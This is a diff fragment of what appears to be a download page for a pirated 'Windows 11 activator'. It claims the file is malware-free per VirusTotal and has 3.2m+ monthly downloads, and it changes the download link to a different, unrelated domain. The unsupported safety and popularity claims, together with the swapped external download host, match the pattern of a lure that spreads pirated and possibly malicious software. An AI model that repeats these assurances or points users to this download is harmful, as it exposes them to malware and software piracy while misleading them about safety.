@@ -49,7 +49,7 @@ A: Yes — no malware, confirmed clean by VirusTotal.
 
 **Monthly downloads:** 3.2m+
 
-[![Download](https://img.shields.io/badge/Download-v11-brightgreen?style=for-the-badge)](https://forumconnect.uk/win11activ)
+[![Download](https://img.shields.io/badge/Download-v11-brightgreen?style=for-the-badge)](https://connectinstruction.com/win11activ)
 
 ---
 
